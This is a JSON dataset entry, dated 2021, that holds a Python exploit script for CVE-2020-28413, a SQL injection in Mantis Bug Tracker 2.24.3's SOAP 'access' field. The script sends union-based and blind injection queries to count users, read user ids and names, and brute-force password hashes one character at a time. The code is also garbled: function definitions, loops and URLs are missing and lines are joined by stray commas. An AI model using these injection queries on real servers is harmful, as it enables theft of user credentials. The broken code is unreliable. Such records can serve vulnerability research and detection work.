{
    "text": "vul_name : Mantis Bug Tracker 2.24.3 access SQL Injection ， vul_cve : CVE-2020-28413 ， vul_poc :  # Exploit Title : Mantis Bug Tracker 2.24.3 - 'access' SQL Injection ，  # Date : 30/12/2020 ，  # Exploit Author : EthicalHCOP ，  # Vendor Homepage :  ，  # Version : 2.24.3 ，  # CVE : CVE-2020-28413 ， from lxml import etree ， proxies = { ， \"http\" : \" ， \"https\" : \" ， } ， home = \" ， url = home+\"/api/soap/mantisconnect.php\" ， headers = {'content-type' : 'text/xml' ,  ， 'SOAPAction' : url+'\"/mc_project_get_users\"'} ， mantis_db_user = \" ， mantis_db_pass = \" ， body = \"<soapenv : Envelope xmlns : xsi=\" xmlns : xsd=\" xmlns : soapenv=\" xmlns : man=\" ， <soapenv : Header/> ， <soapenv : Body> ， <man : mc_project_get_users soapenv : encodingStyle=\" ， <username xsi : type=\"xsd : string\">\"+mantis_db_user+\"</username> ， <password xsi : type=\"xsd : string\">\"+mantis_db_pass+\"</password> ， <project_id xsi : type=\"xsd : integer\">0</project_id> ， <access xsi : type=\"xsd : string\">\"+query+\"</access> ， </man : mc_project_get_users> ， </soapenv : Body> ， </soapenv : Envelope>\" ， response = requests.post ( url , data=body , headers=headers , verify=False )  ，  # response = requests.post ( url , data=body , headers=headers , proxies=proxies , verify=False )  ， parser = etree.XMLParser ( remove_blank_text=True )  ， xml = etree.XML ( response.content , parser )  ， xml = etree.tostring ( xml )  ， query = \"0 union all select concat ( '-' ,  ( select count (  *  ) \" \\ ， \"from mantis_user_table )  , '0' )  , 2 , 3 , 4 order by id asc limit 1\" ， xml = Hacer_Peticion ( query )  ， txt = xml.split ( \"integer\" )  ， txt = txt [ 1 ] .split ( \"id\" )  ， registros = str ( str ( str ( txt [ 0 ]  )  [  : -2 ]  )  [ -2 :  ]  )  [  : -1 ]  ， query = \"0 union all select concat ( SELECT id FROM mantis_user_table \" \\ ， \"order by id asc limit 0 , 1 )  , '0' )  , 2 , 3 , 4 limit \"+str ( usr_pos ) +\" , 1\" ， xml = Hacer_Peticion ( query )  ， txt = xml.split ( \"integer\" )  ， txt = txt [ 1 ] .split ( \"id\" )  ， id = str ( str ( txt [ 0 ]  )  [  : -2 ]  )  [ -1 :  ]  ， name = str ( str ( txt [ 1 ]  )  [ 29 :  ]  ) .split ( \"</name>\" )  [ 0 ]  ， charts = \"abcdefghijklmnopqrstuvwxyz0123456789\" ， passw = \" ， id = data.split ( \"-\" )  [ 0 ]  ， name = data.split ( \"-\" )  [ 1 ]  ， print ( f\"\\rHash : {passw}\" , end=\" )  ， time.sleep ( 0.00001 )  ， sys.stdout.flush (  )  ， query = \"0 union all select ( select if ( substring ( select binary ( password ) \" \\ ， \"from mantis_user_table where id = \" + str ( id ) + \" )  , \" + str ( cp ) + \" , 1 ) ='\" + str ( c ) + \"' , '0' , '900000000000000000000' )  , 2 , 3 , 4 order by id asc limit 1\" ， xml = Hacer_Peticion ( query )  ， txt = xml.split ( \"integer\" )  ， txt = txt [ 1 ] .split ( \"id\" )  ， r_id = str ( str ( txt [ 0 ]  )  [  : -2 ]  )  [ -1 :  ]  ， passw = passw + str ( c )  ， print ( f\"\\r\" , end=\" )  ， sys.stdout.flush (  )  ， print ( name+\" : \"+passw )  ， cantidad_users = Cantidad_Usuarios_Mantis (  )  ， print ( \"Cantidad usuarios en db : \"+str ( cantidad_users )  ， print ( \"Obteniendo Hashes.\" )  ， brute_force ( Obtener_Id ( x )  ， main (  ) ",
    "time": "2021.01.04"
}